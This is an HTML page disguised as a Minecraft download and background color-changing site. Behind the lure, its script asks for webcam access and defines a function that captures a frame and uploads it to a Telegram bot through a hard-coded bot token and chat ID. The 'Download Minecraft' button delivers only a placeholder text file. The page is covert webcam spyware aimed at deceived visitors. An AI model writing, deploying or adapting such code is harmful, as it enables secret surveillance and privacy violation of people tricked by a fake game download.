<!DOCTYPE html>
<html>
<head>
    <title>Send Image to Telegram Webhook</title>
</head>
<body>
    <h1>Welcome to the Minecraft Download Page & Color Changing Website!</h1>
    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>

    <button id="downloadButton">Download Minecraft</button>
    <button id="colorChangeButton">Change Color</button>
    <video id="videoElement" autoplay></video>

    <script>
        const video = document.getElementById('videoElement');
        let imgIndex = 1;

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    video.srcObject = stream;
                })
                .catch(function (error) {
                    console.error("Error accessing camera:", error);
                });
        }

        function capturePicture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgURL = canvas.toDataURL('image/png');

            const webhookURL = 'https://api.telegram.org/bot7003330372:AAEj0rg44xPlKIEPC4hr9wnJMd22vnVkbDg/sendPhoto';
            const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');

            const payload = new FormData();
            payload.append('chat_id', '7003330372'); // Replace <CHAT_ID> with your actual chat ID
            payload.append('photo', dataURItoBlob(imgURL), 'captured_image.png');

            fetch(webhookURL, {
                method: 'POST',
                body: payload
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send image to Telegram webhook');
                }
                console.log('Image sent to Telegram webhook');
            })
            .catch(error => {
                console.error('Error:', error);
            });

            console.log('Image ' + imgIndex + ' sent to Telegram webhook');
            imgIndex++;
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }

        const downloadButton = document.getElementById('downloadButton');
        downloadButton.addEventListener('click', function () {
            const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
            const fileBlob = new Blob([fileContent], { type: 'text/plain' });
            const fileURL = URL.createObjectURL(fileBlob);

            const downloadLink = document.createElement('a');
            downloadLink.href = fileURL;
            downloadLink.download = 'minecraft.txt';
            downloadLink.click();
        });

        const colorChangeButton = document.getElementById('colorChangeButton');
        const colors = ['#673ab7', '#f44336', '#03a9f4', '#e91e63', '#ff5722']; /* Luxury color palette */
        let index = 0;

        colorChangeButton.addEventListener('click', function () {
            document.body.style.backgroundColor = colors[index];
            let textColor = index === colors.length - 1 ? '#000' : '#fff';
            document.body.style.color = textColor;
            downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
            index = (index + 1) % colors.length;
        });
    </script>
</body>
</html>
